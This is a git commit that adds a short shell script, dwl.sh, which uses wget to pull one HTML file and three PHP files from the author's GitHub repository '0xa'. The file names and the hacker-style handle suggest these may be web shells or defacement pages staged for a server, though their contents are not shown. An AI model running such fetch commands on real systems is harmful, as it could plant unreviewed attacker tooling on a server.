da0d257813ebba145eafe473d6a49123a2ab8d1b
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-06-02 11:07:16 +0200

    Create dwl.sh

---
+++ dwl.sh
@@ -0,0 +1,4 @@
+wget https://raw.githubusercontent.com/trhacknon/0xa/main/thk.html
+wget https://raw.githubusercontent.com/trhacknon/0xa/main/trkrw.php
+wget https://raw.githubusercontent.com/trhacknon/0xa/main/trknish.php
+wget https://raw.githubusercontent.com/trhacknon/0xa/main/xenc.php
